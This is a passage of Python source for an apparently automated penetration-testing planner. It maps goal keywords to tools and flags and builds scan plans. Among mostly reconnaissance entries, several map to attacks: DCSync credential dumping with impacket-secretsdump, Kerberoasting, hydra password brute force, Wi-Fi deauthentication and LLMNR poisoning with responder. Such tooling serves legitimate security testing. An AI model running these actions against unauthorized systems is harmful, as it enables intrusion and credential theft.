                "endpoint": ("gobuster", "Endpoint enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "sqli": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
                "sql": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
                "xss": ("nuclei", "XSS scan", "-t http/xss"),
                "dns": ("dig", "DNS enumeration", ""),
                "whois": ("whois", "WHOIS lookup", ""),
                "searchsploit": ("searchsploit", "Exploit search", ""),
                "crack": ("hashcat", "Hash cracking", ""),
                "exploit search": ("searchsploit", "Exploit search", ""),
                "kerberoast": ("impacket-GetUserSPNs", "Kerberoasting", "-dc-ip"),
                "asrep": ("impacket-GetNPUsers", "AS-REP roasting", "-dc-ip -request"),
                "bloodhound": ("bloodhound-python", "BloodHound AD collector", ""),
                "dcsync": ("impacket-secretsdump", "DCSync attack", "-just-dc"),
                "zerologon": ("nmap", "Zerologon check", "--script smb-vuln-zerologon -p 445"),
                "petitpotam": ("nmap", "PetitPotam check", "--script smb-vuln-petitpotam -p 445"),
                "activemq": ("nmap", "ActiveMQ discovery", "-p 61616,8161"),
                "deauth": ("aircrack-ng", "Deauthentication attack", ""),
                "bluetooth": ("bluetoothctl", "Bluetooth device discovery", "scan on"),
                "ssrf": ("nuclei", "SSRF vulnerability scan", "-t http/ssrf"),
                "idor": ("nuclei", "IDOR scan", "-t http/idor"),
                "lfi": ("nuclei", "LFI scan", "-t http/lfi"),
                "rfi": ("nuclei", "RFI scan", "-t http/rfi"),
                "clickjack": ("curl", "Clickjacking check", "-sI -X OPTIONS"),
                "deserialization": (
                    "nuclei",
                    "Insecure deserialization scan",
                    "-t http/deserialization",
                ),
                "open redirect": ("nuclei", "Open redirect scan", "-t http/redirect"),
                "broken access": ("nuclei", "Broken access control scan", "-t http/access-control"),
                "shodan": ("shodan", "Shodan internet device search", "search"),
                "censys": ("censys", "Censys certificate/device search", ""),
                "theharvester": ("theHarvester", "Email/subdomain OSINT harvesting", "-b all"),
                "the harvester": ("theHarvester", "Email/subdomain OSINT harvesting", "-b all"),
                "google dork": ("curl", "Google dorking search", ""),
                "gau": ("gau", "Get all URLs from Wayback Machine", ""),
                "wayback": ("waybackurls", "Wayback Machine URL discovery", ""),
                "waybackurls": ("waybackurls", "Wayback Machine URL discovery", ""),
                "httpx": ("httpx", "HTTP endpoint probing", "-status-code -title -tech-detect"),
                "katana": ("katana", "Web crawler and URL discovery", ""),
                "gospider": ("gospider", "Web spider and content discovery", "-s"),
                "uncover": ("uncover", "Shodan/Censys search via CLI", ""),
                "subjack": ("subjack", "Subdomain takeover detection", ""),
                "subdomain takeover": ("subjack", "Subdomain takeover detection", ""),
                "takeover": ("subjack", "Subdomain takeover detection", ""),
                "trufflehog": ("trufflehog", "Git secret scanning", ""),
                "gitleaks": ("gitleaks", "Git repository secret scanning", ""),
                "sherlock": ("sherlock", "Username search across social networks", ""),
                "holehe": ("holehe", "Email-to-account mapping", ""),
                "maigret": ("maigret", "Username search engine", ""),
                "dnsx": ("dnsx", "DNS toolkit and probing", ""),
                "massdns": ("massdns", "High-speed DNS brute-force resolver", ""),
                "puredns": ("puredns", "DNS brute-force with wildcard filtering", ""),
                "arjun": ("arjun", "HTTP parameter discovery", ""),
                "paramspider": ("paramspider", "Parameter mining from URLs", ""),
                "cloud_enum": ("cloud_enum", "Cloud storage enumeration", ""),
                "scoutsuite": ("scoutsuite", "Multi-cloud security auditing", ""),
                "prowler": ("prowler", "AWS security auditing", ""),
                "certificate transparency": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "crtsh": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "crt.sh": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "interactsh": ("interactsh", "OOB interaction testing client", "-c"),
                "testssl": ("testssl.sh", "SSL/TLS comprehensive testing", ""),
                "ssllabs": ("ssllabs-scan", "SSL Labs API scanner", ""),
                "email osint": ("theHarvester", "Email OSINT harvesting", "-b all"),
                "reverse whois": ("whois", "Reverse WHOIS lookup", ""),
                "asn recon": ("whois", "ASN ownership lookup", ""),
                "asn": ("whois", "ASN ownership lookup", ""),
                "exposed panel": ("nuclei", "Exposed panel scan", "-t http/exposed-panels"),
                "nikto": ("nikto", "Web server vulnerability scan", ""),
                "dork": ("curl", "Google dorking search", ""),
                "adcs": ("nmap", "AD CS certificate services discovery", "-p 80,443,49443"),
                "secret": ("trufflehog", "Git secret scanning", ""),
                "rdap": ("whois", "RDAP lookup", ""),
                "registrar": ("whois", "Registrar lookup", ""),
                "registration": ("whois", "Domain registration lookup", ""),
                "zone transfer": ("dig", "DNS zone transfer", "AXFR"),
                "aaaa": ("dig", "AAAA record lookup", ""),
                "spf": ("dig", "SPF record lookup", "TXT"),
                "dmarc": ("dig", "DMARC record lookup", "TXT"),
                "crawl": ("katana", "Web crawling and URL discovery", ""),
                "spider": ("gospider", "Web spidering and content discovery", "-s"),
                "url": ("gau", "URL discovery from Wayback Machine", ""),
                "parameter": ("arjun", "HTTP parameter discovery", ""),
                "param": ("arjun", "HTTP parameter discovery", ""),
                "leak": ("trufflehog", "Secret leak detection", ""),
                "api key": ("trufflehog", "API key secret scanning", ""),
                "credential": ("trufflehog", "Credential leak detection", ""),
                "social media": ("sherlock", "Social media profile search", ""),
                "social network": ("sherlock", "Social network account search", ""),
                "account": ("sherlock", "Account discovery across platforms", ""),
                "profile": ("sherlock", "User profile search", ""),
                "footprint": ("sherlock", "Digital footprint search", ""),
                "user lookup": ("sherlock", "Username reconnaissance", ""),
                "digital footprint": ("sherlock", "Digital footprint analysis", ""),
                "identity": ("sherlock", "Identity OSINT search", ""),
                "email check": ("holehe", "Email verification", ""),
                "email verify": ("holehe", "Email verification", ""),
                "emails": ("theHarvester", "Email OSINT harvesting", "-b all"),
                "email": ("theHarvester", "Email OSINT harvesting", "-b all"),
                "container": ("nmap", "Container discovery", "-p 2375,2376"),
                "joomla": ("whatweb", "Joomla CMS detection", ""),
                "drupal": ("whatweb", "Drupal CMS detection", ""),
                "magento": ("whatweb", "Magento CMS detection", ""),
                "nginx": ("whatweb", "Nginx web server detection", ""),
                "apache": ("whatweb", "Apache web server detection", ""),
                "iis": ("whatweb", "IIS web server detection", ""),
                "tomcat": ("whatweb", "Apache Tomcat detection", ""),
                "server": ("whatweb", "Web server fingerprinting", ""),
                "js": ("gospider", "JavaScript file discovery", "-s"),
                "javascript": ("gospider", "JavaScript endpoint discovery", "-s"),
                "nmap": ("nmap", "Nmap network scanner", "-sT -T4 --top-ports 100"),
                "whatweb": ("whatweb", "Web technology fingerprinting", ""),
                "wpscan": ("wpscan", "WordPress vulnerability scanner", ""),
                "gobuster": ("gobuster", "Directory/file brute force", ""),
                "ffuf": ("ffuf", "Web fuzzer", ""),
                "nuclei": ("nuclei", "Template-based vulnerability scanner", ""),
                "curl": ("curl", "HTTP/S request tool", "-sIL"),
                "dig": ("dig", "DNS lookup utility", ""),
                "openssl": (
                    "openssl",
                    "SSL/TLS certificate inspection",
                    "s_client -connect {target}:443",
                ),
                "dirb": ("dirb", "Directory brute force tool", ""),
                "dirsearch": ("dirsearch", "Web path discovery tool", ""),
                "rustscan": ("rustscan", "Fast port scanner", ""),
                "naabu": ("naabu", "Fast port scanner", ""),
                "alive": ("httpx", "HTTP live host probing", "-status-code -title -tech-detect"),
                "content": ("gobuster", "Content discovery", "dir -w " + _COMMON_WORDLIST),
                "ct log": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "url parameters": ("arjun", "URL parameter discovery", ""),
                "admin panel": ("nuclei", "Exposed admin panel scan", "-t http/exposed-panels"),
                "login page": ("nuclei", "Exposed login panel scan", "-t http/exposed-panels"),
                "ping": ("ping", "ICMP ping connectivity test", "-c 4"),
            }
            GENERIC_KEYWORDS = frozenset(
                {
                    "scan",
                    "run",
                    "do",
                    "get",
                    "find",
                    "check",
                    "test",
                    "list",
                    "show",
                    "explore",
                    "discover",
                    "probe",
                    "http",
                    "url",
                }
            )
            matched_keyword = None
            best_score = -999999
            for keyword in intent_map:
                if keyword not in goal_lower:
                    continue
                pos = goal_lower.index(keyword)
                word_starts_at_boundary = pos == 0 or not goal_lower[pos - 1].isalnum()
                if not word_starts_at_boundary:
                    continue
                is_complete_word = (
                    pos + len(keyword) >= len(goal_lower)
                    or not goal_lower[pos + len(keyword)].isalnum()
                )
                score = 10000
                score += 5000 if is_complete_word else 0
                score += max(0, 500 - pos) * 20
                score += len(keyword) * 3
                if keyword in GENERIC_KEYWORDS:
                    score -= 50000
                tool_name = intent_map[keyword][0]
                if tool_name in goal_lower.split():
                    score += 50000
                if score > best_score:
                    best_score = score
                    matched_keyword = keyword
            if matched_keyword:
                tool, desc, flags = intent_map[matched_keyword]
                actual_tool = tool
                if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                    for alt in TOOL_ALTERNATIVES[tool]:
                        if alt in avail_set:
                            actual_tool = alt
                            break
                return self.create_plan(
                    goal=goal,
                    steps=[
                        {
                            "description": desc,
                            "tool": actual_tool,
                            "args": {"target": "", "flags": flags},
                        }
                    ],
                )

        if target:
            intent_map = {
                "headers": ("curl", "HTTP headers check", "-sIL"),
                "http": ("curl", "HTTP headers check", "-sIL"),
                "tech": ("whatweb", "Technology fingerprinting", ""),
                "framework": ("whatweb", "Technology fingerprinting", ""),
                "wp": ("wpscan", "WordPress vulnerability scan", ""),
                "wordpress": ("wpscan", "WordPress vulnerability scan", ""),
                "cms": ("whatweb", "CMS fingerprinting", ""),
                "vuln": ("nuclei", "Vulnerability scan", "-t http"),
                "cve": ("nuclei", "CVE scan", "-t http/cves"),
                "fuzz": ("ffuf", "Directory fuzzing", f"-w {_COMMON_WORDLIST}"),
                "directories": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "dirbust": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "endpoint": ("gobuster", "Endpoint enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "sqli": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
                "sql": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
                "xss": ("nuclei", "XSS scan", "-t http/xss"),
                "dns": ("dig", "DNS enumeration", ""),
                "nameserver": ("dig", "DNS enumeration", ""),
                "resolve": ("dig", "DNS enumeration", ""),
                "subdomain": ("subfinder", "Subdomain enumeration", ""),
                "sub": ("subfinder", "Subdomain enumeration", ""),
                "whois": ("whois", "WHOIS lookup", ""),
                "port": ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
                "open port": ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
                "service": ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
                "masscan": ("masscan", "Mass port scan", "--rate 1000 --top-ports 100"),
                "recon": ("nmap", "Recon scan", "-sT -sV -T4 --top-ports 1000"),
                "scan": ("nmap", "Quick scan", "-sT -T4 --top-ports 100"),
                "explore": ("nmap", "Full scan", "-sT -sV -T4 --top-ports 1000"),
                "stealth": (
                    "nmap",
                    "Stealth scan",
                    "-sT -T2 --top-ports 100" if os.name == "nt" else "-sS -T2 --top-ports 100",
                ),
                "ssl": ("nmap", "SSL/TLS check", "--script ssl-enum-ciphers -p 443"),
                "tls": ("nmap", "SSL/TLS check", "--script ssl-enum-ciphers -p 443"),
                "smb": (
                    "nmap",
                    "SMB enumeration",
                    "--script smb-enum-shares,smb-os-discovery -p 445",
                ),
                "brute": (
                    "hydra",
                    "Brute force attack",
                    f"-L {_USERNAME_WORDLIST} -P {_PASSWORD_WORDLIST}",
                ),
                "crack": ("hashcat", "Hash cracking", ""),
                "cors": ("curl", "CORS check", "-sI -H 'Origin: https://evil.com'"),
                "certificate": ("openssl", "Certificate info", "s_client -connect {target}:443"),
                "cipher": ("nmap", "Cipher suite check", "--script ssl-enum-ciphers -p 443"),
                "header": ("curl", "Header check", "-sIL"),
                "cookie": ("curl", "Cookie analysis", "-sIL -D -"),
                "redirect": ("curl", "Redirect chain", "-sIL -o /dev/null -w '%{redirect_url}'"),
                "screenshot": ("eyewitness", "Web screenshot", ""),
                "cloud": ("curl", "Cloud metadata check", "-sI"),
                "aws": ("curl", "AWS metadata check", "-sI"),
                "azure": ("curl", "Azure metadata check", "-sI"),
                "gcp": ("curl", "GCP metadata check", "-sI"),
                "docker": ("nmap", "Docker discovery", "-sT -p 2375,2376"),
                "k8s": ("nmap", "Kubernetes discovery", "-sT -p 6443,10250,10255"),
                "kubernetes": ("nmap", "Kubernetes discovery", "-sT -p 6443,10250,10255"),
                "kube": ("nmap", "Kubernetes discovery", "-sT -p 6443,10250,10255"),
                "api": ("curl", "API endpoint check", "-s -o /dev/null -w '%{http_code}'"),
                "waf": ("nmap", "WAF detection", "--script http-waf-detect -p 80,443"),
                "cdn": ("curl", "CDN detection", "-sI"),
                "ldap": ("nmap", "LDAP enumeration", "--script ldap-rootdse -p 389"),
                "kerberos": ("nmap", "Kerberos enumeration", "--script krb5-enum-users -p 88"),
                "ntlm": ("nmap", "NTLM info", "--script http-ntlm-info -p 80,443"),
                "log4j": (
                    "nuclei",
                    "Log4j vulnerability scan",
                    "-t http/exposures -id CVE-2021-44228",
                ),
                "log4shell": (
                    "nuclei",
                    "Log4Shell vulnerability scan",
                    "-t http/exposures -id CVE-2021-44228",
                ),
                "heartbleed": (
                    "nmap",
                    "Heartbleed vulnerability check",
                    "--script ssl-heartbleed -p 443",
                ),
                "shellshock": ("nuclei", "Shellshock vulnerability scan", "-t http/shellshock"),
                "shellsock": ("nuclei", "Shellshock vulnerability scan", "-t http/shellshock"),
                "spring4shell": (
                    "nuclei",
                    "Spring4Shell vulnerability scan",
                    "-t http/cves -id CVE-2022-22965",
                ),
                "springshell": (
                    "nuclei",
                    "Spring4Shell vulnerability scan",
                    "-t http/cves -id CVE-2022-22965",
                ),
                "struts": (
                    "nuclei",
                    "Apache Struts vulnerability scan",
                    "-t http/cves -id CVE-2017-5638",
                ),
                "traceroute": ("tracert" if _IS_WIN else "traceroute", "Network traceroute", ""),
                "tracert": ("tracert" if _IS_WIN else "traceroute", "Network traceroute", ""),
                "busting": ("gobuster", "Directory busting", f"dir -w {_COMMON_WORDLIST}"),
                "zone transfer": ("dig", "DNS zone transfer", "AXFR"),
                "axfr": ("dig", "DNS zone transfer", "AXFR"),
                "live hosts": ("nmap", "Host discovery", "-sn"),
                "host discovery": ("nmap", "Host discovery", "-sn"),
                "ping sweep": ("nmap", "Ping sweep", "-sn"),
                "up hosts": ("nmap", "Host discovery", "-sn"),
                "searchsploit": ("searchsploit", "Exploit search", ""),
                "exploit search": ("searchsploit", "Exploit search", ""),
                "responder": ("responder", "LLMNR/NBT-NS responder", "-I eth0"),
                "impacket": ("impacket", "Impacket toolkit", ""),
                "bloodhound": ("bloodhound-python", "BloodHound AD collector", ""),
                "zerologon": ("nmap", "Zerologon check", "--script smb-vuln-zerologon -p 445"),
                "petitpotam": ("nmap", "PetitPotam check", "--script smb-vuln-petitpotam -p 445"),
                "dcsync": ("impacket-secretsdump", "DCSync attack", "-just-dc"),
                "kerberoast": ("impacket-GetUserSPNs", "Kerberoasting", "-dc-ip"),
                "asrep": ("impacket-GetNPUsers", "AS-REP roasting", "-dc-ip -request"),
                "snmp": ("nmap", "SNMP enumeration", "--script snmp-* -p 161"),
                "smtp": ("nmap", "SMTP enumeration", "--script smtp-* -p 25,465,587"),
                "imap": ("nmap", "IMAP enumeration", "--script imap-* -p 143,993"),
                "redis": ("nmap", "Redis enumeration", "--script redis-info -p 6379"),
                "mongodb": ("nmap", "MongoDB enumeration", "--script mongodb-* -p 27017"),
                "mysql": ("nmap", "MySQL enumeration", "--script mysql-* -p 3306"),
                "mssql": ("nmap", "MSSQL enumeration", "--script ms-sql-* -p 1433"),
                "elasticsearch": ("nmap", "Elasticsearch discovery", "--script http-title -p 9200"),
                "memcached": ("nmap", "Memcached discovery", "--script memcached-info -p 11211"),
                "jenkins": ("nmap", "Jenkins discovery", "-sT -p 8080,8443,50000"),
                "kafka": ("nmap", "Kafka discovery", "-p 9092,9093"),
                "postgresql": ("nmap", "PostgreSQL enumeration", "--script pgsql-* -p 5432"),
                "postgres": ("nmap", "PostgreSQL enumeration", "--script pgsql-* -p 5432"),
                "rabbitmq": ("nmap", "RabbitMQ discovery", "--script amqp-info -p 5672"),
                "cassandra": ("nmap", "Cassandra discovery", "--script cassandra-* -p 9042"),
                "adcs": (
                    "nmap",
                    "AD CS certificate services discovery",
                    "--script http-title -p 80,443,49443",
                ),
                "graphql": (
                    "curl",
                    "GraphQL introspection",
                    '-s -d \'{"query":"{__schema{types{name}}}"}\' http://{target}/graphql',
                ),
                "swagger": (
                    "curl",
                    "Swagger/OpenAPI discovery",
                    "-s http://{target}/swagger-ui.html",
                ),
                "websocket": (
                    "curl",
                    "WebSocket upgrade check",
                    "-s -H 'Upgrade: websocket' -H 'Connection: Upgrade' http://{target}",
                ),
                "oauth": ("nmap", "OAuth endpoint discovery", "--script http-oauth* -p 80,443"),
                "git": ("curl", "Exposed .git check", "-s http://{target}/.git/HEAD"),
                ".git": ("curl", "Exposed .git check", "-s http://{target}/.git/HEAD"),
                "exposed panels": ("nuclei", "Exposed panel scan", "-t http/exposed-panels"),
                "cve-2021-44228": (
                    "nuclei",
                    "Log4j CVE scan",
                    "-t http/exposures -id CVE-2021-44228",
                ),
                "cve-2022-22965": (
                    "nuclei",
                    "Spring4Shell CVE scan",
                    "-t http/cves -id CVE-2022-22965",
                ),
                "cve-2014-6271": ("nuclei", "Shellshock CVE scan", "-t http/shellshock"),
                "cve-2014-0160": ("nmap", "Heartbleed CVE scan", "--script ssl-heartbleed -p 443"),
                "cve-2017-5638": ("nuclei", "Struts CVE scan", "-t http/cves -id CVE-2017-5638"),
                "cve-2023-46604": (
                    "nuclei",
                    "ActiveMQ CVE scan",
                    "-t http/cves -id CVE-2023-46604",
                ),
                "cve-2023-34362": (
                    "nmap",
                    "MOVEit CVE scan",
                    "--script http-vuln-moveit* -p 80,443",
                ),
                "ssrf": ("nuclei", "SSRF vulnerability scan", "-t http/ssrf"),
                "idor": ("nuclei", "IDOR scan", "-t http/idor"),
                "lfi": ("nuclei", "LFI scan", "-t http/lfi"),
                "rfi": ("nuclei", "RFI scan", "-t http/rfi"),
                "clickjack": ("curl", "Clickjacking check", "-sI -X OPTIONS"),
                "deserialization": (
                    "nuclei",
                    "Insecure deserialization scan",
                    "-t http/deserialization",
                ),
                "open redirect": ("nuclei", "Open redirect scan", "-t http/redirect"),
                "broken access": ("nuclei", "Broken access control scan", "-t http/access-control"),
                "activemq": ("nmap", "ActiveMQ discovery", "-p 61616,8161"),
                "deauth": ("aircrack-ng", "Deauthentication attack", ""),
                "bluetooth": ("bluetoothctl", "Bluetooth device discovery", "scan on"),
                "shodan": ("shodan", "Shodan internet device search", "search {target}"),
                "censys": ("censys", "Censys certificate/device search", "--query {target}"),
                "theharvester": (
                    "theHarvester",
                    "Email/subdomain OSINT harvesting",
                    "-d {target} -b all",
                ),
                "the harvester": (
                    "theHarvester",
                    "Email/subdomain OSINT harvesting",
                    "-d {target} -b all",
                ),
                "gau": ("gau", "Get all URLs from Wayback Machine", ""),
                "httpx": (
                    "httpx",
                    "HTTP endpoint probing",
                    "-u {target} -status-code -title -tech-detect",
                ),
                "katana": ("katana", "Web crawler and URL discovery", "-u {target}"),
                "gospider": ("gospider", "Web spider and content discovery", "-s {target}"),
                "uncover": ("uncover", "Shodan/Censys search via CLI", "--query {target}"),
                "subjack": ("subjack", "Subdomain takeover detection", "-d {target}"),
                "trufflehog": ("trufflehog", "Git secret scanning", ""),
                "gitleaks": ("gitleaks", "Git repository secret scanning", "--path {target}"),
                "sherlock": ("sherlock", "Username search across social networks", ""),
                "holehe": ("holehe", "Email-to-account mapping", ""),
                "maigret": ("maigret", "Username search engine", ""),
                "dnsx": ("dnsx", "DNS toolkit and probing", "-d {target}"),
                "massdns": (
                    "massdns",
                    "High-speed DNS brute-force resolver",
                    "-r resolvers.txt -t A {target}",
                ),
                "puredns": (
                    "puredns",
                    "DNS brute-force with wildcard filtering",
                    "resolve {target}",
                ),
                "arjun": ("arjun", "HTTP parameter discovery", "-u {target}"),
                "paramspider": ("paramspider", "Parameter mining from URLs", "-d {target}"),
                "cloud_enum": ("cloud_enum", "Cloud storage enumeration", "-k {target}"),
                "scoutsuite": ("scoutsuite", "Multi-cloud security auditing", ""),
                "prowler": ("prowler", "AWS security auditing", ""),
                "certificate transparency": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "crtsh": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "crt.sh": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "interactsh": (
                    "interactsh",
                    "OOB interaction testing client",
                    "-c https://{target}",
                ),
                "testssl": ("testssl.sh", "SSL/TLS comprehensive testing", "--full {target}"),
                "ssllabs": ("ssllabs-scan", "SSL Labs API scanner", "--host {target}"),
                "email osint": ("theHarvester", "Email OSINT harvesting", "-d {target} -b all"),
                "reverse whois": ("whois", "Reverse WHOIS lookup", ""),
                "asn recon": ("whois", "ASN ownership lookup", "-h {target}"),
                "wayback": ("waybackurls", "Wayback Machine URL discovery", ""),
                "waybackurls": ("waybackurls", "Wayback Machine URL discovery", ""),
                "exposed panel": ("nuclei", "Exposed panel scan", "-t http/exposed-panels"),
                "takeover": ("subjack", "Subdomain takeover detection", ""),
                "nikto": ("nikto", "Web server vulnerability scan", ""),
                "dork": ("curl", "Google dorking search", ""),
                "http probe": (
                    "httpx",
                    "HTTP endpoint probing",
                    "-status-code -title -tech-detect",
                ),
                "http parameter": ("arjun", "HTTP parameter discovery", ""),
                "asn": ("whois", "ASN ownership lookup", ""),
                "rdap": ("whois", "RDAP lookup", ""),
                "registrar": ("whois", "Registrar lookup", ""),
                "registration": ("whois", "Domain registration lookup", ""),
                "aaaa": ("dig", "AAAA record lookup", ""),
                "spf": ("dig", "SPF record lookup", "TXT"),
                "dmarc": ("dig", "DMARC record lookup", "TXT"),
                "crawl": ("katana", "Web crawling and URL discovery", ""),
                "spider": ("gospider", "Web spidering and content discovery", "-s"),
                "url": ("gau", "URL discovery from Wayback Machine", ""),
                "url discovery": ("gau", "URL discovery from Wayback Machine", ""),
                "url parameter": ("arjun", "HTTP parameter discovery", ""),
                "parameter": ("arjun", "HTTP parameter discovery", ""),
                "param": ("arjun", "HTTP parameter discovery", ""),
                "leak": ("trufflehog", "Secret leak detection", ""),
                "credential": ("trufflehog", "Credential leak detection", ""),
                "social media": ("sherlock", "Social media profile search", ""),
                "social network": ("sherlock", "Social network account search", ""),
                "account": ("sherlock", "Account discovery across platforms", ""),
                "profile": ("sherlock", "User profile search", ""),
                "footprint": ("sherlock", "Digital footprint search", ""),
                "identity": ("sherlock", "Identity OSINT search", ""),
                "email check": ("holehe", "Email verification", ""),
                "email verify": ("holehe", "Email verification", ""),
                "emails": ("theHarvester", "Email OSINT harvesting", "-b all"),
                "email": ("theHarvester", "Email OSINT harvesting", ""),
                "container": ("nmap", "Container discovery", "-sT -p 2375,2376"),
                "joomla": ("whatweb", "Joomla CMS detection", ""),
                "drupal": ("whatweb", "Drupal CMS detection", ""),
                "magento": ("whatweb", "Magento CMS detection", ""),
                "nginx": ("whatweb", "Nginx web server detection", ""),
                "apache": ("whatweb", "Apache web server detection", ""),
                "iis": ("whatweb", "IIS web server detection", ""),
                "tomcat": ("whatweb", "Apache Tomcat detection", ""),
                "server": ("whatweb", "Web server fingerprinting", ""),
                "js": ("gospider", "JavaScript file discovery", "-s {target}"),
                "javascript": ("gospider", "JavaScript endpoint discovery", "-s {target}"),
                "nmap": ("nmap", "Nmap network scanner", "-sT -T4 --top-ports 100"),
                "whatweb": ("whatweb", "Web technology fingerprinting", ""),
                "wpscan": ("wpscan", "WordPress vulnerability scanner", ""),
                "gobuster": ("gobuster", "Directory/file brute force", ""),
                "ffuf": ("ffuf", "Web fuzzer", ""),
                "nuclei": ("nuclei", "Template-based vulnerability scanner", ""),
                "curl": ("curl", "HTTP/S request tool", "-sIL"),
                "dig": ("dig", "DNS lookup utility", ""),
                "openssl": (
                    "openssl",
                    "SSL/TLS certificate inspection",
                    "s_client -connect {target}:443",
                ),
                "dirb": ("dirb", "Directory brute force tool", ""),
                "dirsearch": ("dirsearch", "Web path discovery tool", ""),
                "rustscan": ("rustscan", "Fast port scanner", ""),
                "naabu": ("naabu", "Fast port scanner", ""),
                "alive": ("httpx", "HTTP live host probing", "-status-code -title -tech-detect"),
                "content": ("gobuster", "Content discovery", "dir -w " + _COMMON_WORDLIST),
                "ct log": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "url parameters": ("arjun", "URL parameter discovery", ""),
                "bucket": ("curl", "Cloud storage bucket check", "-sI"),
                "buckets": ("curl", "Cloud storage bucket check", "-sI"),
                "admin panel": ("nuclei", "Exposed admin panel scan", "-t http/exposed-panels"),
                "login page": ("nuclei", "Exposed login panel scan", "-t http/exposed-panels"),
                "ping": ("ping", "ICMP ping connectivity test", "-c 4"),
            }
            # Score each keyword by position and specificity
            matched_keyword = None
            best_score = -999999
            GENERIC_KEYWORDS = frozenset(
                {
                    "scan",
                    "run",
                    "do",
                    "get",
                    "find",
                    "check",
                    "test",
                    "list",
                    "show",
                    "explore",
                    "discover",
                    "probe",
                    "http",
                    "url",
                }
            )
            for keyword in intent_map:
                if keyword not in goal_lower:
                    continue
                pos = goal_lower.index(keyword)
                word_starts_at_boundary = pos == 0 or not goal_lower[pos - 1].isalnum()
                if not word_starts_at_boundary:
                    continue
                # Check if full keyword matches completely or is a prefix
                is_complete_word = (
                    pos + len(keyword) >= len(goal_lower)
                    or not goal_lower[pos + len(keyword)].isalnum()
                )

                score = 10000  # Base score for word boundary match
                score += 5000 if is_complete_word else 0
                score += max(0, 500 - pos) * 20
                score += len(keyword) * 3
                if keyword in GENERIC_KEYWORDS:
                    score -= 50000
                # Massive bonus if a tool name is mentioned as a word in the text
                tool_name = intent_map[keyword][0]
                if tool_name in goal_lower.split():
                    score += 50000
                if score > best_score:
                    best_score = score
                    matched_keyword = keyword
            if matched_keyword:
                tool, desc, flags = intent_map[matched_keyword]
                actual_tool = tool
                if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                    for alt in TOOL_ALTERNATIVES[tool]:
                        if alt in avail_set:
                            actual_tool = alt
                            break
                clean_target = target.replace("https://", "").replace("http://", "").split("/")[0]
                return self.create_plan(
                    goal=goal,
                    steps=[
                        {
                            "description": desc
                            + (f" (via {actual_tool})" if actual_tool != tool else ""),
                            "tool": actual_tool,
                            "args": {"target": clean_target, "flags": flags},
                        }
                    ],
                )

            # ── Step 5: Category-aware probe fallback ───────────────────
            probe_groups = [
                [
                    ("curl", "HTTP headers check", "-sIL"),
                    ("whatweb", "Technology fingerprinting", ""),
                    (
                        "nuclei",
                        "Quick vulnerability scan",
                        "-t http -severity low,medium,high,critical",
                    ),
                    ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
                ],
                [
                    ("dig", "DNS enumeration", ""),
                    ("subfinder", "Subdomain enumeration", ""),
                    ("whois", "WHOIS lookup", ""),
                ],
                [
                    ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
                    ("masscan", "Mass port scan", "--rate 1000 --top-ports 100"),
                ],
            ]
            probe_steps: list[dict[str, Any]] = []
            last_step_id: str | None = None
            for group in probe_groups:
                for tool, desc, flags in group:
                    actual_tool = tool
                    if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                        for alt in TOOL_ALTERNATIVES[tool]:
                            if alt in avail_set:
                                actual_tool = alt
                                break
                    clean_target = (
                        target.replace("https://", "").replace("http://", "").split("/")[0]
                    )
                    step_id = f"probe_{actual_tool}"
                    probe_steps.append(
                        {
                            "id": step_id,
                            "description": desc
                            + (f" (via {actual_tool})" if actual_tool != tool else ""),
                            "tool": actual_tool,
                            "args": {"target": clean_target, "flags": flags},
                            "dependencies": [last_step_id] if last_step_id else [],
                        }
                    )
                    last_step_id = step_id
            if probe_steps:
                plan_type = PlanType.DAG if len(probe_steps) > 2 else PlanType.SEQUENTIAL
                return self.create_plan(goal=goal, steps=probe_steps, plan_type=plan_type)
            return self.create_plan(goal=goal)

        goal_keywords = {
            "scan",
            "recon",
            "audit",
            "check",
            "enum",
            "analyze",
            "analyse",
            "explore",
            "map",
            "discover",
            "probe",
            "test",
            "hack",
            "pentest",
        }
        if any(kw in goal_lower.split() for kw in goal_keywords):
            return self.create_plan(
                goal=goal,
                steps=[
                    {"description": "Technology fingerprinting", "tool": "whatweb", "args": {}},
                    {
                        "description": "Port scan",
                        "tool": "nmap",
                        "args": {"flags": "-sT -T4 --top-ports 100"},
                    },
                ],
            )
        return self.create_plan(goal=goal)

    def _decompose_lightweight(
        self, goal: str, available_tools: list[str] | None = None
    ) -> ExecutionPlan:
        """Lightweight decomposition for sub-commands in 'then' chains.

        Skips template and NLP expansion to avoid over-expanding
        (e.g., 'port scan on example.com' → single nmap step, not network_scan template).
        """
        goal_lower = goal.lower()
        avail_set = set(available_tools or [])

        # Early target extraction
        url_match = re.search(r"(?:https?|tcp|udp|ws|wss)://[^\s]+", goal)
        host_match = re.search(r"\b(?:[\w-]+\.)+[a-z]{2,}\b", goal_lower)
        ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?\b", goal)
